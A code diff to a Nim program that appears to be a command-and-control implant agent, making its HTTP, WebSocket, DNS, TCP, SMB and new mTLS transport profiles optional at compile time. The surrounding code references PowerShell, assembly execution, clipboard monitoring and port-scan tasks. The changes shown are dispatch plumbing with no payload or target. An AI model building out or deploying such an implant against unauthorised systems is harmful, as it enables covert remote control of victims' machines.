@@ -1,11 +1,18 @@
 import std/[json, random, os, base64, tables, times, strformat, asyncdispatch]
 import config
 import global_data
-import profiles/http
-import profiles/websocket
-import profiles/httpx
-import profiles/dns
-import profiles/tcp
+when defined(profile_http):
+  import profiles/http
+when defined(profile_websocket):
+  import profiles/websocket
+when defined(profile_httpx):
+  import profiles/httpx
+when defined(profile_dns):
+  import profiles/dns
+when defined(profile_tcp):
+  import profiles/tcp
+when defined(profile_mtls):
+  import profiles/mtls
 import utils/debug
 import utils/strenc
 import utils/task_processor
@@ -33,7 +40,8 @@ when defined(windows):
     import tasks/powershell as powershellTask
   when defined(cmd_link):
     import tasks/link
-  import profiles/smb
+  when defined(profile_smb):
+    import profiles/smb
   when defined(cmd_execute_assembly):
     import tasks/execute_assembly
   when defined(cmd_inline_execute):
@@ -86,23 +94,40 @@ type
     mtClipboardMonitor, mtPortscan, mtDonut
   
   ProfileKind = enum
-    pkHttp, pkWebSocket, pkHttpx, pkDns, pkTcp, pkSmb
+    pkNone
+    pkHttp
+    pkWebSocket
+    pkHttpx
+    pkDns
+    pkTcp
+    pkSmb
+    pkMtls
   
   Profile = object
     case kind: ProfileKind
+    of pkNone:
+      discard
     of pkHttp:
-      httpProfile: HttpProfile
+      when defined(profile_http):
+        httpProfile: HttpProfile
     of pkWebSocket:
-      wsProfile: WebSocketProfile
+      when defined(profile_websocket):
+        wsProfile: WebSocketProfile
     of pkHttpx:
-      httpxProfile: HttpxProfile
+      when defined(profile_httpx):
+        httpxProfile: HttpxProfile
     of pkDns:
-      dnsProfile: DnsProfile
+      when defined(profile_dns):
+        dnsProfile: DnsProfile
     of pkTcp:
-      tcpProfile: TcpProfile
+      when defined(profile_tcp):
+        tcpProfile: TcpProfile
     of pkSmb:
-      when defined(windows):
+      when defined(profile_smb) and defined(windows):
         smbProfile: SmbProfile
+    of pkMtls:
+      when defined(profile_mtls):
+        mtlsProfile: MtlsProfile
   
   Agent* = ref object
     config: Config
@@ -118,93 +143,183 @@ type
 # Profile helper procs
 proc send(profile: var Profile, data: string, callbackUuid: string = ""): string =
   case profile.kind
+  of pkNone: discard
   of pkHttp:
-    result = profile.httpProfile.send(data, callbackUuid)
+    when defined(profile_http):
+      result = profile.httpProfile.send(data, callbackUuid)
+    else: discard
   of pkWebSocket:
-    result = profile.wsProfile.send(data, callbackUuid)
+    when defined(profile_websocket):
+      result = profile.wsProfile.send(data, callbackUuid)
+    else: discard
   of pkHttpx:
-    result = profile.httpxProfile.send(data, callbackUuid)
+    when defined(profile_httpx):
+      result = profile.httpxProfile.send(data, callbackUuid)
+    else: discard
   of pkDns:
-    result = profile.dnsProfile.send(data, callbackUuid)
+    when defined(profile_dns):
+      result = profile.dnsProfile.send(data, callbackUuid)
+    else: discard
   of pkTcp:
-    result = profile.tcpProfile.send(data, callbackUuid)
+    when defined(profile_tcp):
+      result = profile.tcpProfile.send(data, callbackUuid)
+    else: discard
   of pkSmb:
-    when defined(windows):
+    when defined(profile_smb) and defined(windows):
       result = profile.smbProfile.send(data, callbackUuid)
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      result = profile.mtlsProfile.send(data, callbackUuid)
+    else: discard
 
 proc setAesKey(profile: var Profile, key: seq[byte]) =
   case profile.kind
+  of pkNone: discard
   of pkHttp:
-    profile.httpProfile.setAesKey(key)
+    when defined(profile_http):
+      profile.httpProfile.setAesKey(key)
+    else: discard
   of pkWebSocket:
-    profile.wsProfile.setAesKey(key)
+    when defined(profile_websocket):
+      profile.wsProfile.setAesKey(key)
+    else: discard
   of pkHttpx:
-    profile.httpxProfile.setAesKey(key)
+    when defined(profile_httpx):
+      profile.httpxProfile.setAesKey(key)
+    else: discard
   of pkDns:
-    profile.dnsProfile.setAesKey(key)
+    when defined(profile_dns):
+      profile.dnsProfile.setAesKey(key)
+    else: discard
   of pkTcp:
-    profile.tcpProfile.setAesKey(key)
+    when defined(profile_tcp):
+      profile.tcpProfile.setAesKey(key)
+    else: discard
   of pkSmb:
-    when defined(windows):
+    when defined(profile_smb) and defined(windows):
       profile.smbProfile.setAesKey(key)
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      profile.mtlsProfile.setAesKey(key)
+    else: discard
 
 proc setAesDecKey(profile: var Profile, key: seq[byte]) =
   case profile.kind
+  of pkNone: discard
   of pkHttp:
-    profile.httpProfile.setAesDecKey(key)
+    when defined(profile_http):
+      profile.httpProfile.setAesDecKey(key)
+    else: discard
   of pkWebSocket:
-    profile.wsProfile.setAesDecKey(key)
+    when defined(profile_websocket):
+      profile.wsProfile.setAesDecKey(key)
+    else: discard
   of pkHttpx:
-    profile.httpxProfile.setAesDecKey(key)
+    when defined(profile_httpx):
+      profile.httpxProfile.setAesDecKey(key)
+    else: discard
   of pkDns:
-    profile.dnsProfile.setAesDecKey(key)
+    when defined(profile_dns):
+      profile.dnsProfile.setAesDecKey(key)
+    else: discard
   of pkTcp:
-    profile.tcpProfile.setAesDecKey(key)
+    when defined(profile_tcp):
+      profile.tcpProfile.setAesDecKey(key)
+    else: discard
   of pkSmb:
-    when defined(windows):
+    when defined(profile_smb) and defined(windows):
       profile.smbProfile.setAesDecKey(key)
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      profile.mtlsProfile.setAesDecKey(key)
+    else: discard
 
 proc hasAesKey(profile: Profile): bool {.used.} =
   case profile.kind
+  of pkNone: discard
   of pkHttp:
-    result = profile.httpProfile.hasAesKey()
+    when defined(profile_http):
+      result = profile.httpProfile.hasAesKey()
+    else: discard
   of pkWebSocket:
-    result = profile.wsProfile.hasAesKey()
+    when defined(profile_websocket):
+      result = profile.wsProfile.hasAesKey()
+    else: discard
   of pkHttpx:
-    result = profile.httpxProfile.hasAesKey()
+    when defined(profile_httpx):
+      result = profile.httpxProfile.hasAesKey()
+    else: discard
   of pkDns:
-    result = profile.dnsProfile.hasAesKey()
+    when defined(profile_dns):
+      result = profile.dnsProfile.hasAesKey()
+    else: discard
   of pkTcp:
-    result = profile.tcpProfile.hasAesKey()
+    when defined(profile_tcp):
+      result = profile.tcpProfile.hasAesKey()
+    else: discard
   of pkSmb:
-    when defined(windows):
+    when defined(profile_smb) and defined(windows):
       result = profile.smbProfile.hasAesKey()
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      result = profile.mtlsProfile.hasAesKey()
+    else: discard
 
 proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: string] =
   case profile.kind
+  of pkNone: discard
   of pkHttp:
-    result = profile.httpProfile.performKeyExchange()
+    when defined(profile_http):
+      result = profile.httpProfile.performKeyExchange()
+    else: discard
   of pkWebSocket:
-    result = profile.wsProfile.performKeyExchange()
+    when defined(profile_websocket):
+      result = profile.wsProfile.performKeyExchange()
+    else: discard
   of pkHttpx:
-    result = profile.httpxProfile.performKeyExchange()
+    when defined(profile_httpx):
+      result = profile.httpxProfile.performKeyExchange()
+    else: discard
   of pkDns:
-    result = profile.dnsProfile.performKeyExchange()
+    when defined(profile_dns):
+      result = profile.dnsProfile.performKeyExchange()
+    else: discard
   of pkTcp:
-    result = profile.tcpProfile.performKeyExchange()
+    when defined(profile_tcp):
+      result = profile.tcpProfile.performKeyExchange()
+    else: discard
   of pkSmb:
-    when defined(windows):
+    when defined(profile_smb) and defined(windows):
       result = profile.smbProfile.performKeyExchange()
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      result = profile.mtlsProfile.performKeyExchange()
+    else: discard
 
 proc cleanupConnection(agent: Agent) =
   ## Close profile connection to avoid keeping ESTABLISHED connections during sleep
   case agent.profile.kind
   of pkHttp:
-    agent.profile.httpProfile.cleanup()
+    when defined(profile_http):
+      agent.profile.httpProfile.cleanup()
+    else: discard
   of pkHttpx:
-    agent.profile.httpxProfile.cleanup()
+    when defined(profile_httpx):
+      agent.profile.httpxProfile.cleanup()
+    else: discard
   of pkWebSocket:
-    agent.profile.wsProfile.cleanup()
+    when defined(profile_websocket):
+      agent.profile.wsProfile.cleanup()
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      agent.profile.mtlsProfile.cleanup()
+    else: discard
   else:
     discard  # Other profiles don't need cleanup
 
@@ -212,11 +327,21 @@ proc reconnectProfile(agent: Agent) =
   ## Recreate profile connection after cleanup
   case agent.profile.kind
   of pkHttp:
-    agent.profile.httpProfile.reconnect()
+    when defined(profile_http):
+      agent.profile.httpProfile.reconnect()
+    else: discard
   of pkHttpx:
-    agent.profile.httpxProfile.reconnect()
+    when defined(profile_httpx):
+      agent.profile.httpxProfile.reconnect()
+    else: discard
   of pkWebSocket:
-    agent.profile.wsProfile.reconnect()
+    when defined(profile_websocket):
+      agent.profile.wsProfile.reconnect()
+    else: discard
+  of pkMtls:
+    when defined(profile_mtls):
+      agent.profile.mtlsProfile.reconnect()
+    else: discard
   else:
     discard  # Other profiles don't need reconnect
 
@@ -233,21 +358,50 @@ proc newAgent*(): Agent =
   # Initialize the correct profile based on config
   case result.config.profile
   of "websocket":
-    result.profile = Profile(kind: pkWebSocket, wsProfile: newWebSocketProfile())
+    when defined(profile_websocket):
+      result.profile = Profile(kind: pkWebSocket, wsProfile: newWebSocketProfile())
+    else:
+      debug "[ERROR] Websocket profile not compiled in this build"
+      quit(1)
   of "httpx":
-    result.profile = Profile(kind: pkHttpx, httpxProfile: newHttpxProfile())
+    when defined(profile_httpx):
+      result.profile = Profile(kind: pkHttpx, httpxProfile: newHttpxProfile())
+    else:
+      debug "[ERROR] Httpx profile not compiled in this build"
+      quit(1)
   of "dns":
-    result.profile = Profile(kind: pkDns, dnsProfile: newDnsProfile())
+    when defined(profile_dns):
+      result.profile = Profile(kind: pkDns, dnsProfile: newDnsProfile())
+    else:
+      debug "[ERROR] DNS profile not compiled in this build"
+      quit(1)
   of "tcp":
-    result.profile = Profile(kind: pkTcp, tcpProfile: newTcpProfile())
+    when defined(profile_tcp):
+      result.profile = Profile(kind: pkTcp, tcpProfile: newTcpProfile())
+    else:
+      debug "[ERROR] TCP profile not compiled in this build"
+      quit(1)
+  of "mtls":
+    when defined(profile_mtls):
+      result.profile = Profile(kind: pkMtls, mtlsProfile: newMtlsProfile())
+    else:
+      debug "[ERROR] mTLS profile not compiled in this build"
+      quit(1)
   of "smb":
-    when defined(windows):
+    when defined(profile_smb) and defined(windows):
       result.profile = Profile(kind: pkSmb, smbProfile: newSmbProfile())
     else:
       debug "[ERROR] SMB profile is only supported on Windows"
       quit(1)
-  else:  # Default to HTTP for "http" or any other value
-    result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
+  of "http":
+    when defined(profile_http):
+      result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
+    else:
+      debug "[ERROR] HTTP profile not compiled in this build"
+      quit(1)
+  else:
+    debug "[ERROR] No matching profile compiled for: ", result.config.profile
+    quit(1)
   
   debug "[DEBUG] Agent: Profile initialized successfully"
   
@@ -1418,28 +1572,30 @@ proc runAgent*() =
   var agentInstance = newAgent()
   
   # TCP and SMB profiles are special - they run their own listener loops instead of normal agent loop
-  if cfg.profile == "tcp":
-    debug "[DEBUG] runAgent: TCP profile detected, starting P2P listener"
-    # TCP profile doesn't do normal checkin - clients connect to it
-    # Run the TCP listener loop
-    case agentInstance.profile.kind
-    of pkTcp:
-      waitFor agentInstance.profile.tcpProfile.start()
-    else:
-      discard
-    return
-  
-  if cfg.profile == "smb":
-    when defined(windows):
-      debug "[DEBUG] runAgent: SMB profile detected, starting P2P listener"
-      # SMB profile doesn't do normal checkin - clients connect to it
-      # Run the SMB listener loop
+  when defined(profile_tcp):
+    if cfg.profile == "tcp":
+      debug "[DEBUG] runAgent: TCP profile detected, starting P2P listener"
+      # TCP profile doesn't do normal checkin - clients connect to it
+      # Run the TCP listener loop
       case agentInstance.profile.kind
-      of pkSmb:
-        agentInstance.profile.smbProfile.start()
+      of pkTcp:
+        waitFor agentInstance.profile.tcpProfile.start()
       else:
         discard
-    return
+      return
+  
+  when defined(profile_smb):
+    if cfg.profile == "smb":
+      when defined(windows):
+        debug "[DEBUG] runAgent: SMB profile detected, starting P2P listener"
+        # SMB profile doesn't do normal checkin - clients connect to it
+        # Run the SMB listener loop
+        case agentInstance.profile.kind
+        of pkSmb:
+          agentInstance.profile.smbProfile.start()
+        else:
+          discard
+      return
   
   debug "[DEBUG] runAgent: Agent instance created, starting checkin..."
   
